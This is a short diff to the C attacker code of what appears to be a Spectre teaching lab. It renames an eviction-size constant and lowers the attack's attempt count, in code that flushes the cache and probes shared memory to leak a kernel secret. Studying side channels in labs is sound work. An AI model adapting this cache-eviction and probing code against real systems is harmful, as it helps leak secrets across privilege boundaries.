@@ -13,7 +13,7 @@
 
 #define CACHE_HIT_THRESHOLD 80
 
-#define EVICTION_SIZE (32 * 1024 * 1024)
+#define EVICT_SIZE (32 * 1024 * 1024)
 
 /*
  * call_kernel_part3
@@ -45,8 +45,8 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
-    char *eviction_buf = malloc(EVICTION_SIZE);
-    memset(eviction_buf, 1, EVICTION_SIZE);
+    char *eviction_buf = malloc(EVICT_SIZE);
+    memset(eviction_buf, 1, EVICT_SIZE);
 
     printf("Launching attacker\n");
 
@@ -63,7 +63,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             volatile char tmp = shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
         }
 
-        for (int attempt = 0; attempt < 1000; attempt++) {
+        for (int attempt = 0; attempt < 800; attempt++) {
 
             
 
@@ -74,7 +74,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
             //Add extra evict
             volatile int sink = 0;
-            for (int e = 0; e < EVICTION_SIZE; e += 64) {
+            for (int e = 0; e < EVICT_SIZE; e += 64) {
                 sink += eviction_buf[e];
             }
 
